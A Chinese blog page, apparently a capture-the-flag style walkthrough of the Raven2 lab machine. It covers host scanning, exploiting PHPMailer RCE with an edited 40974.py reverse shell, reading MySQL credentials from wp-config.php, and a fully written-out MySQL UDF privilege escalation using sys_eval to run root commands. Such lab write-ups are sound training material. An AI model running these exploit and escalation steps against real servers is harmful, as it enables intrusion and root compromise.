@@ -1,0 +1,323 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>浅析Raven2靶机 | 虚幻无实</title><meta name="author" content="虚幻无实"><meta name="copyright" content="虚幻无实"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="浅析Raven2靶机[TOC] 一、下载地址：链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1MSvkuNxE_rNrEj-qXCkrWA提取码：sdd7  二、搭建靶机环境攻击机Kali：  IP地址：192.168.6.173  靶机：  IP地址：192.168.6.175  注：靶机与Kali的IP地址只需要在同一局域网即可（同一个网段,即两虚拟机处于同一网络模式） 三、实战渗透3">
+<meta property="og:type" content="website">
+<meta property="og:title" content="浅析Raven2靶机">
+<meta property="og:url" content="http://example.com/permeate/%E6%B5%85%E6%9E%90Raven2%E9%9D%B6%E6%9C%BA.html">
+<meta property="og:site_name" content="虚幻无实">
+<meta property="og:description" content="浅析Raven2靶机[TOC] 一、下载地址：链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1MSvkuNxE_rNrEj-qXCkrWA提取码：sdd7  二、搭建靶机环境攻击机Kali：  IP地址：192.168.6.173  靶机：  IP地址：192.168.6.175  注：靶机与Kali的IP地址只需要在同一局域网即可（同一个网段,即两虚拟机处于同一网络模式） 三、实战渗透3">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img1.baidu.com/it/u=2617250461,42164744&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=300">
+<meta property="article:published_time" content="2022-08-10T02:23:06.729Z">
+<meta property="article:modified_time" content="2022-08-10T02:23:06.729Z">
+<meta property="article:author" content="虚幻无实">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img1.baidu.com/it/u=2617250461,42164744&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=300"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/permeate/%E6%B5%85%E6%9E%90Raven2%E9%9D%B6%E6%9C%BA"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '浅析Raven2靶机',
+  isPost: false,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2022-08-10 10:23:06'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/static-butterfly/dist/css/index.min.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://unpkg.zhimg.com/hexo-butterfly-clock/lib/clock.min.css" /><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207212023398.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> CTF</span></a></div><div class="menus_item"><a class="site-page" href="/code/"><i class="fa-fw fas fa-tags"></i><span> 代码编程</span></a></div><div class="menus_item"><a class="site-page" href="/permeate/"><i class="fa-fw fas fa-tags"></i><span> 渗透测试</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 链接</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-music"></i><span> 友情链接</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 关于</span></a></li></ul></div></div></div></div><div class="page" id="body-wrap"><header class="not-home-page" id="page-header" style="background-image: url('https://img1.baidu.com/it/u=2617250461,42164744&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=300')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">虚幻无实</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> CTF</span></a></div><div class="menus_item"><a class="site-page" href="/code/"><i class="fa-fw fas fa-tags"></i><span> 代码编程</span></a></div><div class="menus_item"><a class="site-page" href="/permeate/"><i class="fa-fw fas fa-tags"></i><span> 渗透测试</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 链接</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-music"></i><span> 友情链接</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 关于</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="page-site-info"><h1 id="site-title">浅析Raven2靶机</h1></div></header><main class="layout" id="content-inner"><div id="page"><div id="article-container"><h1 id="浅析Raven2靶机"><a href="#浅析Raven2靶机" class="headerlink" title="浅析Raven2靶机"></a>浅析Raven2靶机</h1><p>[TOC]</p>
+<h2 id="一、下载地址："><a href="#一、下载地址：" class="headerlink" title="一、下载地址："></a>一、下载地址：</h2><p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1MSvkuNxE_rNrEj-qXCkrWA">https://pan.baidu.com/s/1MSvkuNxE_rNrEj-qXCkrWA</a><br>提取码：sdd7 </p>
+<h2 id="二、搭建靶机环境"><a href="#二、搭建靶机环境" class="headerlink" title="二、搭建靶机环境"></a>二、搭建靶机环境</h2><p><code>攻击机Kali</code>：</p>
+<blockquote>
+<p>IP地址：192.168.6.173</p>
+</blockquote>
+<p><code>靶机</code>：</p>
+<blockquote>
+<p>IP地址：192.168.6.175</p>
+</blockquote>
+<p><strong>注：靶机与Kali的IP地址只需要在同一局域网即可（同一个网段,即两虚拟机处于同一网络模式）</strong></p>
+<h2 id="三、实战渗透"><a href="#三、实战渗透" class="headerlink" title="三、实战渗透"></a>三、实战渗透</h2><h3 id="3-1网络扫描"><a href="#3-1网络扫描" class="headerlink" title="3.1网络扫描"></a>3.1网络扫描</h3><h4 id="3-1-1-启动靶机和Kali后进行扫描"><a href="#3-1-1-启动靶机和Kali后进行扫描" class="headerlink" title="3.1.1 启动靶机和Kali后进行扫描"></a>3.1.1 启动靶机和Kali后进行扫描</h4><h5 id="方法一、arp-scan-I-eth0-l-（指定网卡扫）"><a href="#方法一、arp-scan-I-eth0-l-（指定网卡扫）" class="headerlink" title="方法一、arp-scan -I eth0 -l （指定网卡扫）"></a>方法一、arp-scan -I eth0 -l （指定网卡扫）</h5><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205221603354.png" alt="image-20220522160335321"></p>
+<h5 id="方法二、masscan-扫描的网段-p-扫描端口号"><a href="#方法二、masscan-扫描的网段-p-扫描端口号" class="headerlink" title="方法二、masscan 扫描的网段 -p 扫描端口号"></a>方法二、masscan 扫描的网段 -p 扫描端口号</h5><p>masscan 192.168.6.0&#x2F;24 -p 80,22</p>
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205221604314.png" alt="image-20220522160457287"></p>
+<h5 id="方法三、netdiscover-i-网卡-r-网段"><a href="#方法三、netdiscover-i-网卡-r-网段" class="headerlink" title="方法三、netdiscover -i 网卡-r 网段"></a>方法三、netdiscover -i 网卡-r 网段</h5><p>netdiscover -i eth0 -r 192.168.6.0&#x2F;24</p>
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205221605143.png" alt="image-20220522160554109"></p>
+<h4 id="3-1-2-查看靶机开放的端口"><a href="#3-1-2-查看靶机开放的端口" class="headerlink" title="3.1.2 查看靶机开放的端口"></a>3.1.2 查看靶机开放的端口</h4><p>使用<code>nmap -A -sV -T4 -p- 靶机ip</code>查看靶机开放的端口</p>
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205221609575.png" alt="image-20220522160946538"></p>
+<p>这里发现了4个端口</p>
+<h3 id="3-2枚举漏洞"><a href="#3-2枚举漏洞" class="headerlink" title="3.2枚举漏洞"></a>3.2枚举漏洞</h3><h4 id="22-端口分析"><a href="#22-端口分析" class="headerlink" title="22 端口分析"></a>22 端口分析</h4><p>一般只能暴力破解</p>
+<h4 id="80-端口分析"><a href="#80-端口分析" class="headerlink" title="80 端口分析"></a>80 端口分析</h4><p>访问网站</p>
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205221613168.png" alt="image-20220522161323064"></p>
+<p>扫描一下目录</p>
+<p>dirsearch -u <a target="_blank" rel="noopener" href="http://192.168.6.175/">http://192.168.6.175</a></p>
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205221702010.png" alt="image-20220522170231970"></p>
+<p>进入vendor目录后，发现有很多文件</p>
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205221727628.png" alt="image-20220522172759577"></p>
+<p>在vendor下存在一个版本说明文件，这个应该就是PHPMailer的版本信息了。</p>
+<p>PHPMailer：是一个用于发送电子邮件的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/PHP/9337">PHP</a>函数包。直接用PHP就可以发送，无需搭建复杂的Email服务。</p>
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205221731818.png" alt="image-20220522173103789"></p>
+<p>在网站中关于环境变量的设置，发现第一个flag</p>
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205221732783.png" alt="image-20220522173246758"></p>
+<h3 id="3-3漏洞利用"><a href="#3-3漏洞利用" class="headerlink" title="3.3漏洞利用"></a>3.3漏洞利用</h3><p>PHPMailer版本小于5.2.20存在远程代码执行漏洞</p>
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205221815084.png" alt="image-20220522181501037"></p>
+<p>使用searchsploit 搜索 可以利用的漏洞</p>
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205221816533.png" alt="image-20220522181615500"></p>
+<p>由于我们的版本是5.2.16，&lt;5.2.20版本的都有远程执行漏洞，所以我们用5.2.18版本的exp就行，这里用40974.py</p>
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205221819426.png" alt="image-20220522181933402"></p>
+<p><strong>serchsploit -m 漏洞ID号命令解释</strong>：也就是把漏洞文件下载到当前目录</p>
+<h4 id="3-3-1修改exp，反弹shell"><a href="#3-3-1修改exp，反弹shell" class="headerlink" title="3.3.1修改exp，反弹shell"></a>3.3.1修改exp，反弹shell</h4><p>下载好后，修改exp，替换目标ip target为靶机ip，反弹连接的地址为kali地址。开启本地nc监听。</p>
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205221841881.png" alt="image-20220522184145837"></p>
+<p>修改后，直接python3 40974.py运行程序，</p>
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205221902287.png" alt="image-20220522190209262"></p>
+<p>然后监听端口</p>
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205221902044.png" alt="image-20220522190235022"></p>
+<p>再访问靶机的shell,php页面</p>
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205221902311.png" alt="image-20220522190259282"></p>
+<p>再返回到监听端口的命令框，可以看到成功监听到了反弹shell</p>
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205221903266.png" alt="image-20220522190315245"></p>
+<p>获取完整性shell，将shell转化为pty shell.这里使用一个正向shell，并且用find &#x2F; -name flag*模糊查询查找flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205221908774.png" alt="image-20220522190858751"></p>
+<p>已经查找到了2个flag，分别是flag2和flag3</p>
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205221907448.png" alt="image-20220522190700425"></p>
+<p>使用cat &#x2F;var&#x2F;www&#x2F;flag2.txt，成功找到flag2</p>
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205221914533.png" alt="image-20220522191454510"></p>
+<p>访问<a target="_blank" rel="noopener" href="http://192.168.6.175/wordpress/wp-content/uploads/2018/11/flag3.png%E8%8E%B7%E5%BE%97flag3">http://192.168.6.175/wordpress/wp-content/uploads/2018/11/flag3.png获得flag3</a></p>
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205221917119.png" alt="image-20220522191739910"></p>
+<h3 id="3-4权限提升"><a href="#3-4权限提升" class="headerlink" title="3.4权限提升"></a>3.4权限提升</h3><h4 id="3-4-1信息收集获取Mysql账号密码"><a href="#3-4-1信息收集获取Mysql账号密码" class="headerlink" title="3.4.1信息收集获取Mysql账号密码"></a>3.4.1信息收集获取Mysql账号密码</h4><p>访问<a target="_blank" rel="noopener" href="http://192.168.6.175/wordpress/">http://192.168.6.175/wordpress/</a> 是一个wordpress站点</p>
+<p>直接访问后台wp-admin</p>
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205222029203.png" alt="image-20220522202919176"></p>
+<p><strong>注：</strong>直接访问后台会连接错误，需要修改hosts文件，将192.168.88.211指向raven.local</p>
+<p>修改好后成功进入</p>
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205222029951.png" alt="image-20220522202946917"></p>
+<p>进入wordpress目录打开wp-config.php找到了数据库用户名密码</p>
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205222056941.png" alt="image-20220522205630914"></p>
+<p>有了用户名和密码就能连接数据库了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -pR@v3nSecurity</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205222113521.png" alt="image-20220522211300494"></p>
+<h4 id="3-4-2判断提权条件"><a href="#3-4-2判断提权条件" class="headerlink" title="3.4.2判断提权条件"></a>3.4.2判断提权条件</h4><p>接下来先确定信息，试试能不能用UDF提权，这里发现了root用户的加密信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">use wordpress</span><br><span class="line">show tables;</span><br><span class="line">select * from wp_users;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205222112735.png" alt="image-20220522211204707"></p>
+<p>然后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;secure%&#x27;;</span><br></pre></td></tr></table></figure>
+
+
+
+<p> <strong>解释</strong>:</p>
+<p>1.当 secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入|导出文件，此时无法提权</p>
+<p> 2.当 secure_file_priv 的值为 &#x2F;tmp&#x2F; ，表示限制 mysqld 的导入|导出文件只能发生在 &#x2F;tmp&#x2F; 目录下，  此时也无法提权    </p>
+<p>3.当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出文件做限制，此时可提权</p>
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205222128897.png" alt="image-20220522212827873"></p>
+<p>发现可以导出导入文件</p>
+<p>接下来查询对应的mysql的为数show variables like ‘%compile%’; #查看主机版本及架构</p>
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205222133708.png" alt="image-20220522213325686"></p>
+<p>然后用version()查看版本</p>
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205222146464.png" alt="image-20220522214613437"></p>
+<h4 id="3-4-3下载UDF提权脚本"><a href="#3-4-3下载UDF提权脚本" class="headerlink" title="3.4.3下载UDF提权脚本"></a>3.4.3下载UDF提权脚本</h4><p>64位的mysql数据库，5.56的版本。去找对应的payload，可以在msf目录下查找就行</p>
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205222151575.png" alt="image-20220522215113554"></p>
+<p>因为数据库是64位的，所以必须要使用lib_mysqludf_sys_64.so</p>
+<p><strong>注</strong>：dll文件普遍在windows下使用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用cp  /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.so /home/kali复制出来</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后在当前目录开放下载</p>
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205222157478.png" alt="image-20220522215734453"></p>
+<p>然后用wget下载下来</p>
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205222221663.png" alt="image-20220522222154634"></p>
+<p>再次连接数据库</p>
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205222224344.png" alt="image-20220522222458312"></p>
+<h4 id="3-4-3将提权脚本写入数据库"><a href="#3-4-3将提权脚本写入数据库" class="headerlink" title="3.4.3将提权脚本写入数据库"></a>3.4.3将提权脚本写入数据库</h4><p>UDF提权的核心就是，将mysql的plugin目录下，将上面插件引入数据库，执行命令<br>所以要查询plugin目录的绝对目录，查询到plugin目录为&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;plugin%&#x27;&#x27;&#x27;;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205222225929.png" alt="image-20220522222556907"></p>
+<p>创建一个表用来存so文件的内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table temp6(data longblob);</span><br></pre></td></tr></table></figure>
+
+<p><strong>注：</strong>在MySQL中Blob是一个二进制的对象，它是一个可以存储大量数据的容器(如图片，音乐等等)，且能容纳不同大小的数据，在MySQL中有四种Blob类型，他们的区别就是可以容纳的信息量不容分别是以下四种:<br>①TinyBlob类型 最大能容纳255B的数据<br>②Blob类型 最大能容纳65KB的<br>③MediumBlob类型 最大能容纳16MB的数据<br>④LongBlob类型 最大能容纳4GB的数据</p>
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205222229086.png" alt="image-20220522222903063"></p>
+<p>接下来将文件写入表中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into temp6(data) values (load_file(&#x27;/var/www/html/lib_mysqludf_sys_64.so&#x27;));</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205222237096.png" alt="image-20220522223739070"></p>
+<p>将表中的文件内容，输出成一个文件，并存放到plugin目录中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select data from temp6 into dumpfile &quot;/usr/lib/mysql/plugin/udf64.so&quot;;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205222238186.png" alt="image-20220522223837163"></p>
+<p>导入文件，创建sys_eval函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create function sys_eval returns string soname &#x27;udf64.so&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205222239065.png" alt="image-20220522223914038"></p>
+<p>之后就可以使用sys_eval函数执行命令试试了</p>
+<p>输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sys_eval(&#x27;whoami&#x27;);查看我们的权限</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205222240032.png" alt="image-20220522224035008"></p>
+<p>ok，提权成功，接下来直接看flag文件就行了</p>
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205222241123.png" alt="image-20220522224155100"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入select sys_eval(&#x27;cat /root/flag4.txt&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205222242677.png" alt="image-20220522224251640"></p>
+<p>成功找到flag</p>
+</div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207212023398.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">虚幻无实</div><div class="author-info__description">知其黑，守其白</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xiajiajun233?tab=repositories" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:911147426@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/07/22/SQLI-LABS%E9%9D%B6%E5%9C%BA/" title="SQLI-LABS"><img src="https://img1.baidu.com/it/u=2617250461,42164744&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=300" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQLI-LABS"/></a><div class="content"><a class="title" href="/2022/07/22/SQLI-LABS%E9%9D%B6%E5%9C%BA/" title="SQLI-LABS">SQLI-LABS</a><time datetime="2022-07-22T10:47:57.206Z" title="发表于 2022-07-22 18:47:57">2022-07-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/07/18/123/" title="CTFhub - SQL注入-2"><img src="https://img1.baidu.com/it/u=2617250461,42164744&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=300" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTFhub - SQL注入-2"/></a><div class="content"><a class="title" href="/2022/07/18/123/" title="CTFhub - SQL注入-2">CTFhub - SQL注入-2</a><time datetime="2022-07-18T06:45:09.086Z" title="发表于 2022-07-18 14:45:09">2022-07-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/07/18/hello-world/" title="Hello World"><img src="https://img1.baidu.com/it/u=2617250461,42164744&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=300" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hello World"/></a><div class="content"><a class="title" href="/2022/07/18/hello-world/" title="Hello World">Hello World</a><time datetime="2022-07-18T06:30:46.706Z" title="发表于 2022-07-18 14:30:46">2022-07-18</time></div></div></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/07/"><span class="card-archive-list-date">七月 2022</span><span class="card-archive-list-count">3</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">3</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2022-11-06T11:15:04.426Z"><i class="fa-solid fa-spinner 